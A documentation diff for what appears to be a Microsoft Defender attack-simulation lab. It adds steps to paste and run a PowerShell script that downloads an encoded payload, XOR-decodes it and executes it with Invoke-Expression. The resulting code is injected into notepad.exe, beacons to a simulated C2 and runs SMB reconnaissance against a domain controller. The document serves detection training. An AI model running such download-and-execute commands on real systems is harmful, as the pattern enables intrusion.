@@ -58,12 +58,16 @@ There are two devices used in this scenario: a test device and a domain controll
 
 If you use an existing tenant and implement device groups, create a dedicated device group for the test device and push it to top level in configuration UX.
 
+
 ## Run the simulation
 
 To run the attack scenario simulation:
-    1.	Log in to the test device with the test user account.
-    2.	Open a Windows PowerShell window on the test device.
-    3.	Copy the following simulation script:
+
+1.	Log in to the test device with the test user account.
+
+2.	Open a Windows PowerShell window on the test device.
+
+3.	Copy the following simulation script:
 ```
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
 = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
@@ -74,6 +78,22 @@ $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encodin
 >[!NOTE]
 >If you open this document on a web browser, you might encounter problems copying the full text without losing certain characters or introducing extra line breaks. Download this document and open it on Adobe Reader.
 
+4. At the prompt, paste and run the copied script.
+
+>[!NOTE]
+>If you're running PowerShell using remote desktop protocol (RDP), use the Type Clipboard Text command in the RDP client because the CTRL-V hotkey or right-click-paste method might not work.  Recent versions of PowerShell sometimes will also not accept that method, you might have to copy to Notepad in memory first, copy it in the virtual machine, and then paste it into PowerShell.
+
+A few seconds later, notepad.exe will open. A simulated attack code will be injected into notepad.exe. Keep the automatically generated Notepad instance open to experience the full scenario.
+
+The simulated attack code will attempt to communicate to an external IP address (simulating the C2 server) and then attempt reconnaissance against the domain controller via SMB.
+
+You will see a message displayed on the PowerShell console when this script completes.
+
+```
+ran NetSessionEnum against [DC Name] with return code result 0      
+```
+
+To see the Automated Incident and Response feature in action, keep the notepad.exe process open. You will see Automated Incident and Response stop the Notepad process.
 
 
 ## Investigate an incident
